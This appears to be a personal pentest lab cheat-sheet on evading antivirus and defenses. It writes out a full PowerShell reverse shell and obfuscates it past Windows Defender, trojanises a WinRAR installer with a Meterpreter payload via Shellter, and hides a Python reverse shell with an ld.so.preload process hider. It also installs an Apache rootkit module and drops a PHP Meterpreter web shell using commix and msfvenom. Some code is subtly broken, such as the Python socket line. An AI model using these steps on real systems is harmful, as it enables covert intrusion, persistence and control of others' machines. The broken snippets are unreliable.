Evasion Techniques


linode - HS


### Invoke-Obfuscation


On kali (attacker VM)

  - pwsh                                                                                                #(powershell)
  - PS> /home/kali> cd ./Invoke-Obfuscation
  - PS> /home/kali/Invoke-Obfuscation> import-module ./Invoke-Obfuscation.psd1                          #(from https://github.com/danielbohannon/Invoke-Obfuscation)
  - PS> /home/kali> Invoke-Obfuscation
  
  - Invoke-Obfuscation> 
  

#(First, Find a PS Reverse Shell CMD)
#(from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)
#(copy/paste it on a note)

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

#(modify and save it at 'shell.ps1')

$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


 - Invoke-Obfuscation> SET SCRIPTPATH /home/kali/shell.ps1                             #(TECHNIQUE 1)
 - Invoke-Obfuscation> ENCODING
 - Invoke-Obfuscation/Encoding> ENCODING 5 (or 2,3,4,6,7 ...)
 - Invoke-Obfuscation/Encoding> ENCODING 5
       - BIJWGCIUGWIUVIUCVI@^*&%*&*(JCKBKJVBECY@GU89656747VJHV                         #(copy the all (long) result in a note 'reverse-shell.ps1')   
       
       
 On kali (attacker VM)
 
  - serve
       - Serving HTTP on 0.0.0.0 prot 80 ...
       
  - nc -nlvp 1234
       - listening on [any] 1234 ...
       
  
 On the Win (target VM)
  
   - Enable Win Defender
   - Launch reverse-shell.ps1                                                   #(quiet Win Defender but no reverse shell with ENCODING 5. Try w/2 or 3,4,5,6,7....)
   
   
   
   - Invoke-Obfuscation> SET SCRIPTPATH /home/kali/shell.ps1                    #(TECHNIQUE 2 = powerful = AST mode)
   - Invoke-Obfuscation/AST> ALL
   - Invoke-Obfuscation/AST> 1
   - Invoke-Obfuscation/AST>
         - Ser.Variable.coiehciowev.4883746hfwngklw                             #(copy the result in a note 'obfuscated.ps1') 
   
   
On the Win (target VM)
  
   - Enable Win Defender
   - Launch obfuscated.ps1                                                      #(quiet Win Defender and the reverse-shell works !)



### SHELLTER

https://www.shellterproject.com/


On kali (attacker VM)

 - cd /usr/share/windows-resources/shellter/
 
 - Dowmload the original winrar.32.bits.exe                                       #(32 bits only works w/ shellter)
 
 - sudo wine shellter.exe
     - choose A (automatic mode)
     - PE target > /home/kali/Downloads/winrar.32.bits.exe  
     - Enable Stealth Mode > Y 
     - PAYLOADS
       [1] Meterpreter_Reverse_TCP
       [2] Meterpreter_Reverse_HTTP
       [3] Meterpreter_Reverse_HTTPS
       [4] Meterpreter_Bind_TCP
       [5] Shell_Reverse_TCP
       [6] Shell_Bind_TCP
       [7] WinExec 
     - Use a listed payload or custom > L
     - Select payload by index > 1
     - Meterpreter_Reverse_TCP > SET LHOST: 10.10.10.10
     - Meterpreter_Reverse_TCP > SET LPORT: 1234
     - Save the payload on kali disk
     
     
 - serve
       - Serving HTTP on 0.0.0.0 prot 80 ...
     
     
 - msfconsole
       - msf6 > use multi/handler
       - msf6 exploit (multi/handler) > set payload windows/meterpreter/reverse_tcp
       - msf6 exploit (multi/handler) > set LHOST 10.10.10.10
       - msf6 exploit (multi/handler) > set LPORT 1234
       - msf6 exploit (multi/handler) > set AutoRunScript post/windows/manage/migrate
       - msf6 exploit (multi/handler) > run
            - starting reverse TCP handles on 10.10.10.10:1234 ... 
            
            
 On the Win (target VM)
   
   - execute winrar.32.bits.exe 
   - run anyway                                           #(reverse shell works via meterpreter !)
   
   
### Defense Evasion


$ cat /etc/*release
$ uname -a 
$ ps aux

#(Git clone libprocesshider)

$ /tmp/libprocesshider$ make                                    #(compilation activated)

$ nc -nlvp 1234 ...

#(Create a reverse shell python )

$ nano shell.py
    - #!/usr/bin/python3
      from os import dup2
      from subprocess import run
      import socket
      s=socket.socker(socket.AF_INET.socket.SOCK_STREAM)
      s.connect(("10.10.10.10",1234))
      dup2(s.fileno(),0)
      dup2(s.fileno(),1)
      dup2(s.fileno(),2)
      run(["/bin/bash","-i"])
      
$ /tmp/ $ chmod +x shell.py
$ /tmp/ $ tmux
$ /tmp/ $ ./shell.py

$ /tmp/ $ ps aux                              #(we wanna hide "/usr/bin/python3/shell.py" on the list)
$ /tmp/libprocesshider$ nano processhider.c                   #(customize it = shell.py)
$ /tmp/libprocesshider$ make                                  #(compilation activated)
$ /tmp/libprocesshider$ cp libprocesshider.so /usr/local/lib
$ /tmp/libprocesshider$ ls -al /usr/local/lib
$ /tmp/libprocesshider$ echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
$ /tmp/libprocesshider$ cat /etc/ld.so.preload

$ nc -nlvp 1234 ...

$ /tmp/ $ ./shell.py
 
$ /tmp/ $ ps aux               #(Hide success!)   



### Linux Defense Evasion



- On Kali (attaker VM)

#(Git clone apache-rookit on the disk)

$ sudo apt-get install apache2-dev
$ /tmp/apache-rootkit $ vim mod_authg.c                    #(read or modify it)
$ /tmp/apache-rootkit $ whatis apxs
$ /tmp/apache-rootkit $ apxs -c -i mod_authg.c
$ /tmp/apache-rootkit $ ls -alps /etc/apache2
$ /tmp/apache-rootkit $ ls -al /usr/lib/apache2/modules
$ /tmp/apache-rootkit $ vim /etc/apache2/apache2.conf        #(write LoadModule authg_module /usr/lib/apache2/modules/mod_authg.so and below <Location /authg> SetHandler authg </Location> , and save it)
$ /tmp/apache-rootkit $ systemctl restart apache2

#(Go on the wep app 10.10.10.10/authg?c=cat/etc/passwd or whoami)     #(injection success!)


#(Technique 2 = Commix)


$ sudo apt-get install commix -y
$ commix -u http://10.10.10.10/authg/?c/=id   

commix(os_shell) > ?
commix(os_shell) > ls                   #(bin boot dev etc home lib ....)
commix(os_shell) > id                   #(uid=33(www-data))
commix(os_shell) > cat /etc/passwd

$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e php/base64 -f raw > ~/Desktop/shell.php               #(on the file and add <?php BJIWGIUGUI48693 ?>)

msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp/
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set LHOST 10.10.10.10
msf6 exploit(multi/handler) > set LPORT 1234
msf6 exploit(multi/handler) > run
    - Started reverse tcp handler on 10.10.10.10 ...
    
commix(os_shell) > commix -u http://10.10.10.10/authg/?c/=id --file-write='/home/kali/Desktop/shell.php' --file-dest='var/www/html/shell.php'

$ ls -al /var/www/html/                 #(shell.php is here) 

#(Go on the wep app 10.10.10.10/shell.php)     #(reverse shell success!)

meterpreter > sysinfo 
















   
   
       
 
 




